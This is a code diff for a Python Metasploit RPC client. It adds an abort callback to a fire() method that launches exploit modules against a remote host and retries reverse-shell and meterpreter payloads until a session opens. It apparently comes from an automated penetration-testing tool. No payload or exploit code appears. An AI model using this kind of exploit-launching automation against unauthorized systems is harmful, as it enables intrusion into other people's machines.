@@ -835,7 +835,7 @@ class MsfClient:
                 break
         return data
 
-    def fire(self, candidate, host, rhost, port, credential=None):
+    def fire(self, candidate, host, rhost, port, credential=None, abort=None):
         """Detonate the module against rhost. Returns (session, status, detail) with
         the status vocabulary of _fire_once (session, no_session, blocked, error).
         The best reverse payload is tried first (shells before meterpreter, per
@@ -845,7 +845,9 @@ class MsfClient:
         rather than target resistance (the java_rmi_server shell-vs-meterpreter case).
         Lower-rank and speculative candidates get a single attempt, so a dead host
         does not double the fire phase. Each attempt owns its own LPORT and handler
-        job; the loop stops on the first non-no_session result."""
+        job; the loop stops on the first non-no_session result. abort, when given,
+        is checked before each payload retry; True ends the loop so no further
+        payload is sent (the caller's stop-at-first-session gate)."""
         try:
             modref = _strip_type(candidate.module)
             exploit = self._client.modules.use("exploit", modref)
@@ -861,7 +863,9 @@ class MsfClient:
         # advances only on a clean no_session, so a blocked or error stops it at once.
         cap = 2 if _rank_value(candidate.rank) >= 500 else 1
         result = (None, "no_session", "fired, no session within timeout")
-        for payload_name in payloads[:cap]:
+        for i, payload_name in enumerate(payloads[:cap]):
+            if i and abort is not None and abort():
+                break
             result = self._fire_once(exploit, candidate, host, rhost, port,
                                      payload_name, credential)
             if result[1] != "no_session":
